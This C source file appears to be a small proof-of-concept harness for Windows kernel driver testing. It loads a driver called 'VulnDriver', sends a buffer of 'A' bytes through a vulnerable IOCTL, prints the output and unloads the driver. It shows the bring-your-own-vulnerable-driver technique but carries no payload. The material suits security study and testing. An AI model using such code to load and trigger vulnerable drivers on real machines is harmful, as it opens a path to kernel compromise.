# include <stdio.h>
# include "core.h"

int main() {
    HANDLE device;
    DWORD bytes_returned;
    char input_buffer[IOCTL_BUFFER_SIZE];
    char output_buffer[IOCTL_BUFFER_SIZE];

    if (!LoadDriver(driver_name, L"\\Driver\\VulnDriver")) {
        yapBad("Error loading vulnerable driver: %d", GetLastError());
        return EXIT_FAILURE;
    }

    device = CreateFile(device_name, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (device == INVALID_HANDLE_VALUE) {
        yapBad("Error opening vulnerable driver device: %d", GetLastError());
        return EXIT_FAILURE;
    }

    memset(input_buffer, 'A', IOCTL_BUFFER_SIZE);

    if (!DeviceIoControl(device, IOCTL_VULN_CODE, input_buffer, IOCTL_BUFFER_SIZE, output_buffer, IOCTL_BUFFER_SIZE, &bytes_returned, NULL)) {
        yapBad("Error sending IOCTL: %d", GetLastError());
        return EXIT_FAILURE;
    }

    yapInfo("Output buffer:\n%s\n", output_buffer);

    if (!UnloadDriver(L"\\Driver\\VulnDriver")) {
        yapBad("Error unloading vulnerable driver: %d", GetLastError());
        return EXIT_FAILURE;
    }

    CloseHandle(device);

    return 0;
}
